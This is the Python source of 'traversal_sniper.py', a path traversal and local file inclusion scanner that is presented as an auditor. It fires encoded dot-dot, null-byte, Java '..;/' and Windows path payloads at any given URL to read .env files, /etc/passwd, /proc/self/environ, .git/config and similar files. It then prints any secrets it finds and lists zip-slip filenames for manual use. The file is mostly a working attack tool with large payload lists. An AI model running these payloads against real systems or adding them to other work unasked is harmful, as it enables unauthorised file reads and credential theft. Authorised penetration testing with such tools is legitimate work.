"""
traversal_sniper.py — Path Traversal / LFI Auditor.

Vectors:
  1. Known direct paths (package.json, .env, Dockerfile, etc.)
  2. Relative path traversal sequences (double-dot, URL-encoded, Unicode)
  3. Null-byte + double-extension bypass (%00.jpg, .php%00.txt)
  4. Static root traversal (web/, public/, dist/, assets/)
  5. Parameter-based LFI (?file=, ?path=, ?template=)
  6. API file-serve endpoint patterns
  7. Windows absolute and UNC paths
  8. Java servlet path confusion (;jsessionid=, /..;/)
  9. Zip-slip manifest payloads (for upload endpoints)
  10. Absolute path payloads when --app-root is provided

Usage:
    python TOOLS/traversal_sniper.py --url http://target.com
    python TOOLS/traversal_sniper.py --url http://target.com --app-root /var/www/app
    python TOOLS/traversal_sniper.py --url http://target.com --verbose
"""
import argparse
import os
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vibe_core import VibeTool

# ---------------------------------------------------------------------------
# High-value target files
# ---------------------------------------------------------------------------
TARGETS = [
    ".env",
    ".env.local",
    ".env.production",
    ".env.development",
    ".env.example",
    ".env.test",
    "package.json",
    "package-lock.json",
    "yarn.lock",
    "server.js",
    "index.js",
    "app.js",
    "config.js",
    "config.json",
    "config.yaml",
    "config.yml",
    "settings.py",
    "database.yml",
    "secrets.yml",
    "credentials.yml",
    "wp-config.php",
    "web.config",
    "appsettings.json",
    "application.properties",
    "Dockerfile",
    "docker-compose.yml",
    ".git/config",
    ".git/HEAD",
    "shadow",
    "passwd",
]

# ---------------------------------------------------------------------------
# Traversal sequences to prepend to each target
# ---------------------------------------------------------------------------
TRAVERSAL_SEQS = [
    # Standard
    "../",
    "../../",
    "../../../",
    "../../../../",
    "../../../../../",
    "../../../../../../",
    # URL-encoded single
    "%2e%2e/",
    "%2e%2e%2f",
    "..%2f",
    "..%2F",
    # Double-encoded
    "%252e%252e%252f",
    "%252e%252e/",
    "..%252f",
    # Backslash (Windows)
    "..\\",
    "..%5c",
    "..%5C",
    "%2e%2e%5c",
    # Mixed slash
    "..%2F",
    "..\\/",
    # Overlong UTF-8 encoding
    "%c0%ae%c0%ae/",
    "%c0%ae%c0%ae%c0%af",
    # Unicode variants
    "..%e2%80%ae",  # U+202E RIGHT-TO-LEFT OVERRIDE
    # Null-byte traversal (some langs truncate at \x00)
    "%00../",
    "../%00",
    # Path confusion
    "/..;/",         # Java servlet path confusion
    ";/../",
    # Double slash
    "..//",
    "../..//",
    # Static dir prefixes that resolve before traversal
    "static/../",
    "assets/../",
    "public/../",
    "dist/../",
    "build/../",
    "uploads/../",
    "static/../../",
    "assets/../../",
]

# Null-byte + extension bypass suffixes (bypass whitelist extension checks)
NULL_BYTE_SUFFIXES = [
    "%00.jpg",
    "%00.png",
    "%00.txt",
    "%00.pdf",
    "%2500.jpg",
    "\x00.jpg",
    "....//",        # double-slash normalization bypass
]

# Windows-specific paths
WINDOWS_PATHS = [
    "/../../../../../../windows/win.ini",
    "/..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini",
    "/../../../../../../windows/system32/drivers/etc/hosts",
    "/..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini",
    "/../../../../../boot.ini",
    "/%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini",
]

# Java servlet path confusion
JAVA_PATHS = [
    "/admin/..;/console",
    "/api/..;/.env",
    "/static/..;/../.env",
    "/;/.env",
    "/servlet/..%2f..%2f.env",
    "/%2e%2e/%2e%2e/.env",
]

# Static asset roots to combine with traversal
STATIC_ROOTS = [
    "/",
    "/static/",
    "/assets/",
    "/public/",
    "/files/",
    "/img/",
    "/images/",
    "/js/",
    "/css/",
    "/media/",
    "/uploads/",
    "/download/",
    "/api/static/",
    "/resources/",
]

# Parameter-based LFI
PARAM_PAYLOADS = [
    "/api/health?file=../.env",
    "/api/health?path=../.env",
    "/api/config?file=../.env",
    "/api/config?include=../.env",
    "/api/config?load=../.env",
    "/api/chat?template=../../.env",
    "/api/chat?persona=../../.env",
    "/api/render?template=../../.env",
    "/api/page?file=../../.env",
    "/api/resource?path=../../.env",
    "/api/file?name=.env",
    "/api/file?name=../../.env",
    "/api/file?path=../../.env",
    "/api/serve?file=../../.env",
    "/api/download?file=../../.env",
    "/api/export?file=../../.env",
    "/api/read?file=../../.env",
    "/api/open?file=../../.env",
    "/api/include?file=../../.env",
    "/api/view?file=../../.env",
    # Encoded
    "/api/file?name=%2e%2e%2f.env",
    "/api/file?path=..%2F.env",
    "/api/file?name=..%5C.env",
    # /proc (Linux)
    "/api/file?path=/proc/self/environ",
    "/api/file?path=/proc/self/cmdline",
    "/api/health?file=/etc/passwd",
]

# Well-known directly accessible sensitive files
DIRECT_FILES = [
    "/package.json",
    "/package-lock.json",
    "/yarn.lock",
    "/.env",
    "/.env.local",
    "/.env.production",
    "/.env.development",
    "/.env.example",
    "/server.js",
    "/index.js",
    "/app.js",
    "/config.js",
    "/config.json",
    "/webpack.config.js",
    "/vite.config.js",
    "/next.config.js",
    "/nuxt.config.js",
    "/vercel.json",
    "/render.yaml",
    "/fly.toml",
    "/railway.json",
    "/.github/workflows/deploy.yml",
    "/Dockerfile",
    "/docker-compose.yml",
    "/docker-compose.yaml",
    "/.git/config",
    "/.git/HEAD",
    "/.gitignore",
    "/web.config",
    "/appsettings.json",
    "/wp-config.php",
    "/phpinfo.php",
    "/.htaccess",
    "/robots.txt",          # may reveal hidden paths
    "/sitemap.xml",         # may reveal hidden paths
    "/crossdomain.xml",
    "/clientaccesspolicy.xml",
]

# API file-serve endpoint patterns
API_FILE_PATTERNS = [
    "/api/file?name={t}",
    "/api/file?path={t}",
    "/api/file?f={t}",
    "/api/file?filename={t}",
    "/api/serve?file={t}",
    "/api/resource?path={t}",
    "/api/download?file={t}",
    "/api/export?file={t}",
    "/api/read?file={t}",
    "/api/open?file={t}",
    "/api/static/{t}",
    "/files/{t}",
    "/download/{t}",
]

# Zip-slip paths (for upload endpoints) — just log the payloads for manual use
ZIP_SLIP_PATHS = [
    "../../.env",
    "../../../etc/passwd",
    "../../../../windows/win.ini",
    "../../server.js",
]

# ---------------------------------------------------------------------------
# Hit-detection: what actually looks like a confirmed traversal
# ---------------------------------------------------------------------------
ENV_VAR_RE = re.compile(r"[A-Z][A-Z0-9_]{2,}=\S+")
SECRETS_RE = re.compile(
    r"(?:sk-|OPENROUTER|API_KEY|SECRET|PASSWORD|TOKEN|DATABASE_URL|PRIVATE_KEY|aws_access)",
    re.IGNORECASE,
)
WIN_INI_RE = re.compile(r"for 16-bit app support", re.IGNORECASE)
PASSWD_RE  = re.compile(r"root:x:0:|daemon:x:|nobody:x:")
GIT_CFG_RE = re.compile(r"\[core\]|\[remote")
JSON_PKG_RE = re.compile(r'"name"\s*:\s*"[^"]+"\s*,\s*"version"')


def _is_traversal_hit(body: str, path: str, status: int, ct: str = "") -> str | None:
    """
    Return a reason string if the response looks like a confirmed traversal,
    or None for false-positive / catch-all 200.
    """
    if not body or status == 0:
        return None

    # 404/405 → no hit
    if status in (404, 405, 410):
        return None

    # Must be a non-HTML response (or very short HTML that embeds secrets)
    is_html = "html" in ct.lower() or body.lstrip()[:15].lower().startswith("<!doctype")

    if PASSWD_RE.search(body):
        return "/etc/passwd read"
    if WIN_INI_RE.search(body):
        return "windows/win.ini read"
    if GIT_CFG_RE.search(body):
        return ".git/config read"
    if JSON_PKG_RE.search(body) and not is_html:
        return "package.json read"
    if SECRETS_RE.search(body):
        return "API key / secret in body"
    if ENV_VAR_RE.findall(body) and not is_html and status == 200:
        matches = ENV_VAR_RE.findall(body)
        if len(matches) >= 2:
            return f".env read ({len(matches)} vars)"

    # For non-.env files: a clean 200 non-HTML response of size > 50 for direct known paths
    if status == 200 and not is_html and len(body) > 50:
        if any(t in path for t in (".git", "Dockerfile", "docker-compose", "web.config",
                                   "appsettings", "wp-config", "phpinfo", ".htaccess")):
            return f"sensitive file accessible ({path})"

    return None


def _absolute_root_payloads(app_root: str) -> list[str]:
    """Build precise absolute-path payloads when --app-root is given."""
    root = (app_root or "").strip().rstrip("/\\")
    if not root:
        return []
    sep = "\\" if (":" in root[:3] or "\\" in root) else "/"
    payloads = []
    for target in (".env", ".env.local", "server.js", "package.json", "config.json"):
        raw = f"{root}{sep}{target}"
        payloads.append(f"/{raw}")
        payloads.append("/" + urllib.parse.quote(raw, safe=""))
    return payloads


class TraversalSniper(VibeTool):
    def __init__(self):
        super().__init__("Traversal Sniper", "Path Traversal / LFI Auditor")
        self.hits: list[tuple[str, str, str]] = []  # (path, reason, snippet)
        self.verbose = False

    def _try(self, base: str, path: str) -> tuple[int, str, str]:
        url = base + path if path.startswith("/") else base + "/" + path
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=6) as r:
                ct = r.headers.get("Content-Type", "")
                body = r.read(80000).decode(errors="replace")
                return r.status, body, ct
        except urllib.error.HTTPError as e:
            ct = e.headers.get("Content-Type", "") if hasattr(e, "headers") else ""
            body = ""
            try:
                body = e.read(4096).decode(errors="replace")
            except Exception:
                pass
            return e.code, body, ct
        except Exception:
            return 0, "", ""

    def _check(self, base: str, path: str) -> bool:
        status, body, ct = self._try(base, path)
        reason = _is_traversal_hit(body, path, status, ct)
        if reason:
            self.log(f"[HIT] {path} — {reason} (HTTP {status}, {len(body)}b)", "hack")
            self.hits.append((path, reason, body[:400]))
            self.record_finding(
                title=f"Path Traversal / LFI: {reason}",
                severity="critical",
                location=base + path,
                evidence=f"Path: {path}\nReason: {reason}\nSnippet: {body[:200]}",
                recommendation=(
                    "Jail all file-serving to a strict root directory using realpath() checks. "
                    "Reject any path containing '..', null bytes, or URL-encoded variants before path resolution. "
                    "Never pass user input directly to filesystem APIs."
                ),
                cwe="CWE-22",
                owasp="A05:2021-Security Misconfiguration",
            )
            return True
        elif self.verbose and status not in (404, 405, 410, 0):
            self.log(f"  [{status}] {path} ({len(body)}b, {ct[:40]})")
        return False

    def _vector_direct(self, base: str) -> None:
        self.log("=== DIRECT: Well-Known Sensitive Files ===")
        for path in DIRECT_FILES:
            self._check(base, path)

    def _vector_traversal(self, base: str) -> None:
        self.log("=== TRAVERSAL: Dot-Dot Sequences ===")
        for seq in TRAVERSAL_SEQS:
            for target in TARGETS[:8]:  # limit to .env variants + package.json
                self._check(base, "/" + seq + target)
                # Null-byte suffixes
                for suffix in NULL_BYTE_SUFFIXES[:3]:
                    self._check(base, "/" + seq + target + suffix)

    def _vector_static_roots(self, base: str) -> None:
        self.log("=== STATIC ROOTS: Traversal Through Known Asset Directories ===")
        for root in STATIC_ROOTS:
            for seq in ["../", "../../", "../../..", "%2e%2e/"]:
                for target in [".env", ".env.local", "package.json", "server.js"]:
                    self._check(base, root + seq + target)

    def _vector_params(self, base: str) -> None:
        self.log("=== PARAMETER-BASED LFI ===")
        for path in PARAM_PAYLOADS:
            self._check(base, path)

    def _vector_api_fileserve(self, base: str) -> None:
        self.log("=== API FILE-SERVE ENDPOINTS ===")
        for pattern in API_FILE_PATTERNS:
            for target in [".env", ".env.local", "../../.env", "../../../etc/passwd"]:
                self._check(base, pattern.format(t=target))

    def _vector_windows(self, base: str) -> None:
        self.log("=== WINDOWS PATHS ===")
        for path in WINDOWS_PATHS:
            self._check(base, path)

    def _vector_java(self, base: str) -> None:
        self.log("=== JAVA SERVLET PATH CONFUSION ===")
        for path in JAVA_PATHS:
            self._check(base, path)

    def _vector_absolute(self, base: str, app_root: str) -> None:
        if not app_root:
            return
        self.log("=== ABSOLUTE PATHS (from --app-root) ===")
        for path in _absolute_root_payloads(app_root):
            self._check(base, path)

    def _report_zip_slip(self) -> None:
        self.log("=== ZIP SLIP: Upload Payload Paths (manual testing) ===")
        self.log("If the target has a file upload, inject these as filenames in a zip:", "info")
        for zp in ZIP_SLIP_PATHS:
            self.log(f"  {zp}", "info")

    def run(self, url: str, app_root: str = "", verbose: bool = False) -> None:
        self.banner()
        self.verbose = verbose
        base = url.rstrip("/")
        self.log(f"Traversal audit: {base}")

        self._vector_direct(base)
        self._vector_params(base)
        self._vector_api_fileserve(base)
        self._vector_traversal(base)
        self._vector_static_roots(base)
        self._vector_windows(base)
        self._vector_java(base)
        self._vector_absolute(base, app_root)
        self._report_zip_slip()

        self.log("=" * 48)
        if self.hits:
            self.log(f"TRAVERSAL CONFIRMED — {len(self.hits)} path(s) accessible!", "hack")
            for path, reason, content in self.hits:
                self.log(f"  {path}: {reason}", "hack")
                if content:
                    self.log(f"  content: {content[:200]}", "crit")
        else:
            self.log("No traversal confirmed. Filesystem appears properly jailed.", "pass")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Traversal Sniper — Path Traversal / LFI Auditor"
    )
    parser.add_argument("--url", required=True, help="Target base URL")
    parser.add_argument(
        "--app-root", default="",
        help="Absolute app root leaked in a stack trace, e.g. /var/www/app",
    )
    parser.add_argument("--verbose", "-V", action="store_true", help="Log all non-404 responses")
    parser.add_argument("-v", "--version", action="version", version="Traversal Sniper 2.0.0")
    args = parser.parse_args()
    TraversalSniper().run(args.url, app_root=args.app_root, verbose=args.verbose)
